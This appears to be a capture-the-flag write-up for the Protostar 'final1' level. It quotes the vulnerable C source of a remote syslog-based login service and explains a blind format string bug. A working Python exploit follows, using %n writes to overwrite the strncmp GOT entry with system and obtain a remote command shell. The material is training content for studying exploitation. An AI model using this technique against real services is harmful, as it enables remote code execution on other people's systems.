## FINAL ONE ##
This level is a remote blind format string level. The ‘already written’ bytes 
can be variable, and is based upon the length of the IP address and port number.
When you are exploiting this and you don’t necessarily know your IP address and 
port number (proxy, NAT / DNAT, etc), you can determine that the string is 
properly aligned by seeing if it crashes or not when writing to an address you 
know is good.
Core files will be in /tmp.
This level is at /opt/protostar/bin/final1

### Source Code ###
```C
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();

}
```
The vulnerability we can exploit here is the *syslog* function. *syslog* works
like *printf* in the sense that we can use %n to modify a value at an address.
The idea is to overwrite *strncmp* GOT entry with the *system* function. Then,
everytime *strncmp* is called, the *system* function is called instead. Notice
that since *fgets* alread filled up the required stack for *strncmp*, and the
first argument is a string sent from a remote machine (from *line*). That means,
if the remote machine sends a command line, *system* can perform that command
line on the local machine.
```python
import struct
import socket
import telnetlib

HOST = '127.0.0.1'
PORT = 2994
GOT = 0x804a1a8
USERNAME = "dddd"
LOGIN = "%20$101x%20$08n" + "%21$79x%21$08n" + "%22$237x%22$08n" + "%23$203x%23$08n"
GOT0 = struct.pack("I", GOT)
GOT1 = struct.pack("I", GOT + 1)
GOT2 = struct.pack("I", GOT + 2)
GOT3 = struct.pack("I", GOT + 3)

#Login from 127.0.0.1:34947 as [aaa] with password [AAAA]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
reply = s.recv(1024)
print reply
ip, port = s.getsockname()
hostname = ip + ":" + str(port)
print hostname
pad = "A" * (22 - len(hostname))

s.send("username" + " " + USERNAME + "\n")
reply = s.recv(1024)
print reply
s.send("login" + " " + GOT0 + GOT1 + GOT2 + GOT3 + pad  + LOGIN + "\n")
reply = s.recv(1024)
print reply
#s.send("id")
#reply = s.recv(1024)
#print reply
#s.close()
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

